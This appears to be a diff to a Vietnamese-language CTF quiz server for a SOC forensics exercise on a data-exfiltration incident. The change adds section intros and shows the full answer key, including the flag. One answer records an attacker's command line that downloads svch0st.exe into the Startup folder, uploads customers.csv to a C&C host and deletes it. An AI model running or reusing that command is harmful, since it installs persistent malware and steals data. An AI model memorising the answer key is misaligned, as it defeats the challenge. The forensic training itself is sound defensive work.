@@ -7,6 +7,7 @@ FLAG = "GDUCTF{soc_exfiltration_mastered}"
 # --- BỘ CÂU HỎI VÀ ĐÁP ÁN ---
 QUESTIONS = [
     {
+        "context": "--- PHẦN 1: MẠNG (PCAP) ---\n[Câu 1] Qua quá trình giám sát hệ thống Team SOC phát hiện cuộc tấn công Data exfiltration attack. Sử dụng file capture.pcapng để trả lời các câu hỏi sau:",
         "q": "[Câu 1.1] Địa chỉ IP của attacker là gì?",
         "a": r"89.248.163.49"
     },
@@ -27,6 +28,7 @@ QUESTIONS = [
         "a": r"dstrootcax3.p7c"
     },
     {
+        "context": "--- PHẦN 2: TỆP HỆ THỐNG (MFT) ---\n[Câu 2] Sau khi báo cáo các thông tin thu thập được từ nhật ký mạng, công ty đã tiến hành trích xuất thêm tệp MFT để tìm kiếm thêm thông tin bổ sung về cuộc tấn công. Phân tích file MFT để trả lời các câu sau:",
         "q": "[Câu 2.1] Username của người dùng bị xâm nhập:",
         "a": r"Alice Wong"
     },
@@ -35,6 +37,7 @@ QUESTIONS = [
         "a": r".\PathUnknown\DirectorywithID0x000005EC-00000001\AliceWong\Downloads\ F0rtigate_setup.exe"
     },
     {
+        "context": "--- PHẦN 3: NHẬT KÝ SỰ KIỆN (EVTX) ---\n[Câu 3] Tiếp tục thu thập thông tin từ nhật ký sự kiện của hệ thống để tìm kiếm thêm thông tin của cuộc tấn công. Phân tích file log.evtx để trả lời các câu sau:",
         "q": "[Câu 3.1] Địa chỉ của Máy chủ C&C của Attacker:",
         "a": r"10.0.2.15"
     },
@@ -44,6 +47,7 @@ QUESTIONS = [
         "a": r'''C:\WINDOWS\system32\cmd.exe /c "powershell.exe -c "(New-Object System.NET.WebClient).DownloadFile(\'http://10.0.2.15:8080/svch0st.exe\\',\\'C:\\Users\\Alice Wong\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\svch0st.exe\'); (New-Object System.NET.WebClient).DownloadFile(\'http://10.0.2.15:8080/svch0st.exe\\',\\'C:\\Users\\Alice Wong\AppData\Local\Temp\svch0st.exe\')" && curl -F "file=@C:\Users\Alice Wong\Downloads\customers.csv" http://10.0.2.15:5000/upload && del customers.csv"'''
     },
     {
+        "context": "--- PHẦN 4: HỆ THỐNG MAIL SERVER (EML) ---\n[Câu 4] Tiếp tục thu thập thông tin từ hệ thống mail server của công ty để tìm kiếm thêm thông tin của cuộc tấn công. Phân tích file mail.eml để trả lời các câu hỏi sau:",
         "q": "[Câu 4.1] Đây là hình thức tấn công gì? (*** / ********)",
         "a": r"Phishing/Email spoofing"
     },
@@ -74,6 +78,9 @@ class CTFHandler(socketserver.BaseRequestHandler):
         self.send_msg("[!] CẢNH BÁO: Nhập sai 1 ký tự, kết nối sẽ TỰ ĐỘNG BỊ CẮT.\n")
         
         for i, item in enumerate(QUESTIONS):
+            if "context" in item:
+                self.send_msg(f"\n{item['context']}")
+
             self.send_msg(f"{item['q']}")
             self.request.sendall(b"Answer: ") 
             
